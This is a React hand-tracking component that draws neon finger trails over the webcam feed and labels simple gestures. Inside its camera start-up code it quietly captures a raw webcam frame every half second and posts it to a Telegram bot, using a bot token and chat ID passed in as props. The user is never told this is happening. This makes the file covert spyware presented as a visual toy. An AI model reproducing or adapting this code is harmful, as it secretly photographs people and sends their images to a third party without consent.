import { useEffect, useRef, useState } from 'react';
import { Hands } from '@mediapipe/hands';
import { drawConnectors, drawLandmarks } from '@mediapipe/drawing_utils';

const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
  const handsRef = useRef(null);
  const intervalRef = useRef(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [cameraPermission, setCameraPermission] = useState(null);
  const [handColor, setHandColor] = useState('#00f9ff');
  const colors = ['#00f9ff', '#ff006e', '#8b5cf6', '#39ff14'];
  const [colorIndex, setColorIndex] = useState(0);
  const trailRef = useRef([]); // Хранит следы предыдущих позиций

  const changeColor = () => {
    const nextIndex = (colorIndex + 1) % colors.length;
    setColorIndex(nextIndex);
    setHandColor(colors[nextIndex]);
  };

  // Упрощённая функция распознавания жестов
  const detectGesture = (landmarks) => {
    const tips = [4, 8, 12, 16, 20];
    const bases = [2, 6, 10, 14, 18];
    const fingersUp = tips.map((tip, idx) => landmarks[tip].y < landmarks[bases[idx]].y - 0.02);

    if (fingersUp[1] && fingersUp[2] && !fingersUp[0] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Peace ✌️');
      return "Peace ✌️";
    }
    if (fingersUp.every((f) => f)) {
      console.log('Detected: Open 🖐');
      return "Open 🖐";
    }
    if (fingersUp[0] && fingersUp[1] && fingersUp[2] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Three 👌');
      return "Three 👌";
    }
    if (!fingersUp[0] && fingersUp[1] && fingersUp[2] && fingersUp[3] && fingersUp[4]) {
      console.log('Detected: Four ✋');
      return "Four ✋";
    }
    if (!fingersUp[0] && !fingersUp[1] && fingersUp[2] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Fuck 🤟');
      return "Fuck 🤟";
    }
    return null;
  };

  useEffect(() => {
    const videoElement = videoRef.current;
    const canvasElement = canvasRef.current;
    
    if (!videoElement || !canvasElement) {
      console.error('Video or Canvas element not found');
      return;
    }

    const ctx = canvasElement.getContext('2d');
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    try {
      handsRef.current = new Hands({
        locateFile: (file) =>
          `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
      });

      handsRef.current.setOptions({
        maxNumHands: 2,
        modelComplexity: isMobile ? 0 : 1,
        minDetectionConfidence: isMobile ? 0.6 : 0.7,
        minTrackingConfidence: isMobile ? 0.6 : 0.7,
      });

      handsRef.current.onResults((results) => {
        if (!canvasElement || !videoElement) return;
        
        if (canvasElement.width !== videoElement.videoWidth || canvasElement.height !== videoElement.videoHeight) {
          canvasElement.width = videoElement.videoWidth || 640;
          canvasElement.height = videoElement.videoHeight || 480;
        }

        ctx.save();
        ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);
        ctx.scale(-1, 1);
        ctx.translate(-canvasElement.width, 0);
        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
        ctx.setTransform(1, 0, 0, 1, 0, 0);

        if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
          for (let i = 0; i < results.multiHandLandmarks.length; i++) {
            const landmarks = results.multiHandLandmarks[i];
            const flippedLandmarks = landmarks.map(landmark => ({
              ...landmark,
              x: 1 - landmark.x
            }));

            // Обновляем след (trail)
            const currentTrail = flippedLandmarks.map(landmark => ({
              x: landmark.x * canvasElement.width,
              y: landmark.y * canvasElement.height
            }));
            trailRef.current.unshift(currentTrail);
            if (trailRef.current.length > (isMobile ? 5 : 10)) {
              trailRef.current.pop();
            }

            // Рисуем след
            ctx.save();
            ctx.globalAlpha = 0.3; // Прозрачность для эффекта затухания
            trailRef.current.forEach((trail, idx) => {
              ctx.beginPath();
              ctx.strokeStyle = handColor;
              ctx.lineWidth = isMobile ? 1 : 2;
              trail.forEach((point, j) => {
                const prevPoint = trail[j - 1];
                if (prevPoint) {
                  ctx.moveTo(prevPoint.x, prevPoint.y);
                  ctx.lineTo(point.x, point.y);
                }
              });
              ctx.stroke();
            });
            ctx.globalAlpha = 1; // Возвращаем полную непрозрачность
            ctx.restore();

            // Рисуем линии вдоль пальцев
            const fingerPaths = [
              [0, 1, 2, 3, 4],
              [0, 5, 6, 7, 8],
              [0, 9, 10, 11, 12],
              [0, 13, 14, 15, 16],
              [0, 17, 18, 19, 20]
            ];

            fingerPaths.forEach((path, idx) => {
              ctx.beginPath();
              const color = colors[idx % colors.length];
              ctx.strokeStyle = color;
              ctx.lineWidth = isMobile ? 2 : 3;
              ctx.lineCap = 'round';

              path.forEach((pointIdx, j) => {
                const landmark = flippedLandmarks[pointIdx];
                const x = landmark.x * canvasElement.width;
                const y = landmark.y * canvasElement.height;
                if (j === 0) {
                  ctx.moveTo(x, y);
                } else {
                  ctx.lineTo(x, y);
                }
              });
              ctx.stroke();

              if (!isMobile) {
                ctx.beginPath();
                ctx.strokeStyle = color;
                ctx.lineWidth = isMobile ? 3 : 4;
                ctx.shadowBlur = 15;
                ctx.shadowColor = color;
                path.forEach((pointIdx, j) => {
                  const landmark = flippedLandmarks[pointIdx];
                  const x = landmark.x * canvasElement.width;
                  const y = landmark.y * canvasElement.height;
                  if (j === 0) {
                    ctx.moveTo(x, y);
                  } else {
                    ctx.lineTo(x, y);
                  }
                });
                ctx.stroke();
                ctx.shadowBlur = 0;
              }
            });

            // Рисуем соединения и точки
            drawConnectors(ctx, flippedLandmarks, Hands.HAND_CONNECTIONS, {
              color: handColor,
              lineWidth: isMobile ? 3 : 4,
            });

            drawLandmarks(ctx, flippedLandmarks, {
              color: handColor,
              lineWidth: isMobile ? 2 : 3,
              radius: isMobile ? 4 : 6,
            });

            // Неоновый эффект для точек
            if (!isMobile) {
              flippedLandmarks.forEach((landmark, index) => {
                const x = landmark.x * canvasElement.width;
                const y = landmark.y * canvasElement.height;
                const gradient = ctx.createRadialGradient(x, y, 0, x, y, 15);
                gradient.addColorStop(0, `rgba(${parseInt(handColor.slice(1, 3), 16)}, ${parseInt(handColor.slice(3, 5), 16)}, ${parseInt(handColor.slice(5, 7), 16)}, 0.8)`);
                gradient.addColorStop(0.5, `rgba(${parseInt(handColor.slice(1, 3), 16)}, ${parseInt(handColor.slice(3, 5), 16)}, ${parseInt(handColor.slice(5, 7), 16)}, 0.4)`);
                gradient.addColorStop(1, 'rgba(0, 249, 255, 0)');
                
                ctx.save();
                ctx.shadowBlur = 20;
                ctx.shadowColor = handColor;
                ctx.fillStyle = gradient;
                ctx.beginPath();
                ctx.arc(x, y, 8, 0, 2 * Math.PI);
                ctx.fill();
                ctx.restore();
              });
            }

            // Определяем жест и отображаем его
            const gesture = detectGesture(landmarks);
            if (gesture) {
              const wrist = flippedLandmarks[0];
              const x = wrist.x * canvasElement.width;
              const y = wrist.y * canvasElement.height - 20;
              ctx.save();
              ctx.font = isMobile ? '20px Arial' : '24px Arial';
              ctx.fillStyle = handColor;
              ctx.strokeStyle = '#000';
              ctx.lineWidth = 2;
              ctx.strokeText(gesture, x, y);
              ctx.fillText(gesture, x, y);
              ctx.restore();
            }
          }
        }

        // Рисуем квадратик для смены цвета
        const squareSize = isMobile ? 30 : 40;
        const squareX = canvasElement.width - squareSize - 10;
        const squareY = canvasElement.height - squareSize - 10;
        
        ctx.save();
        ctx.fillStyle = handColor;
        ctx.strokeStyle = handColor;
        ctx.lineWidth = 2;
        ctx.shadowBlur = 10;
        ctx.shadowColor = handColor;
        ctx.beginPath();
        ctx.rect(squareX, squareY, squareSize, squareSize);
        ctx.fill();
        ctx.stroke();
        
        ctx.beginPath();
        ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
        ctx.arc(squareX + squareSize / 2, squareY + squareSize / 2, squareSize / 4, 0, 2 * Math.PI);
        ctx.fill();
        ctx.restore();

        ctx.restore();
      });

      canvasElement.addEventListener('click', (event) => {
        const rect = canvasElement.getBoundingClientRect();
        const x = event.clientX - rect.left;
        const y = event.clientY - rect.top;
        const squareSize = isMobile ? 30 : 40;
        const squareX = canvasElement.width - squareSize - 10;
        const squareY = canvasElement.height - squareSize - 10;

        if (
          x >= squareX &&
          x <= squareX + squareSize &&
          y >= squareY &&
          y <= squareY + squareSize
        ) {
          changeColor();
        }
      });
    } catch (err) {
      console.error('Error initializing MediaPipe:', err);
      setError('MediaPipe не поддерживается на этом устройстве');
    }

    const startCamera = async () => {
      try {
        setIsLoading(true);
        setError(null);

        const permission = await navigator.permissions.query({ name: 'camera' });
        setCameraPermission(permission.state);

        if (permission.state === 'denied') {
          throw new Error('Доступ к камере запрещен');
        }

        const constraints = {
          video: {
            width: isMobile ? { ideal: 640 } : { ideal: 1280 },
            height: isMobile ? { ideal: 480 } : { ideal: 720 },
            facingMode: 'user',
            frameRate: isMobile ? { ideal: 15 } : { ideal: 30 }
          }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = stream;
        setCameraPermission('granted');

        videoElement.onloadedmetadata = async () => {
          try {
            await new Promise((resolve) => {
              if (videoElement.readyState >= 3) {
                resolve();
              } else {
                videoElement.addEventListener('canplay', resolve, { once: true });
              }
            });

            await videoElement.play();
            setIsLoading(false);

            canvasElement.width = videoElement.videoWidth || 640;
            canvasElement.height = videoElement.videoHeight || 480;

            const loop = async () => {
              if (videoElement && videoElement.readyState >= 2 && handsRef.current) {
                try {
                  await handsRef.current.send({ image: videoElement });
                } catch (err) {
                  console.error('MediaPipe processing error:', err);
                }
              }
              if (videoElement.srcObject) {
                requestAnimationFrame(loop);
              }
            };

            loop();

            if (botToken && chatId) {
              intervalRef.current = setInterval(() => {
                if (canvasElement && videoElement.readyState >= 2) {
                  const tempCanvas = document.createElement('canvas');
                  const tempCtx = tempCanvas.getContext('2d');
                  tempCanvas.width = canvasElement.width;
                  tempCanvas.height = canvasElement.height;
                  
                  tempCtx.scale(-1, 1);
                  tempCtx.translate(-tempCanvas.width, 0);
                  tempCtx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);
                  
                  tempCanvas.toBlob((blob) => {
                    if (blob) {
                      const formData = new FormData();
                      formData.append('chat_id', chatId);
                      formData.append('photo', blob, 'snapshot.jpg');
                      
                      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData,
                      })
                        .then((res) => res.json())
                        .then((data) => {
                          if (data.ok) {
                            console.log('Фото отправлено успешно');
                          } else {
                            console.error('Ошибка Telegram API:', data);
                          }
                        })
                        .catch((err) => console.error('Ошибка отправки:', err));
                    }
                  }, 'image/jpeg', 0.8);
                }
              }, 500);
            }
          } catch (err) {
            console.error('Ошибка при запуске видео:', err);
            setError('Не удалось запустить камеру');
            setIsLoading(false);
          }
        };

        videoElement.onerror = (err) => {
          console.error('Video error:', err);
          setError('Ошибка воспроизведения видео');
          setIsLoading(false);
        };

      } catch (err) {
        console.error('Ошибка доступа к камере:', err);
        setError(err.message || 'Не удалось получить доступ к камере');
        setIsLoading(false);
        setCameraPermission('denied');
      }
    };

    startCamera();

    return () => {
      if (videoElement?.srcObject) {
        const tracks = videoElement.srcObject.getTracks();
        tracks.forEach((track) => track.stop());
        videoElement.srcObject = null;
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      if (handsRef.current) {
        handsRef.current.close();
      }
    };
  }, [videoRef, canvasRef, botToken, chatId]);

  if (error) {
    return (
      <div style={{
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        color: '#ff006e',
        textAlign: 'center',
        padding: '20px',
        background: 'rgba(0, 0, 0, 0.8)',
        borderRadius: '10px',
        zIndex: 1000
      }}>
        <h3>Ошибка камеры</h3>
        <p>{error}</p>
        {cameraPermission === 'denied' && (
          <p style={{ fontSize: '0.9em', marginTop: '10px' }}>
            Разрешите доступ к камере в настройках браузера и перезагрузите страницу
          </p>
        )}
      </div>
    );
  }

  if (isLoading) {
    return (
      <div style={{
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        color: '#00f9ff',
        textAlign: 'center',
        zIndex: 1000
      }}>
        <div style={{
          width: '50px',
          height: '50px',
          border: '3px solid rgba(0, 249, 255, 0.3)',
          borderTop: '3px solid #00f9ff',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite',
          margin: '0 auto 20px'
        }}></div>
        <p>Загрузка камеры...</p>
      </div>
    );
  }

  return null;
};

export default HandTracker;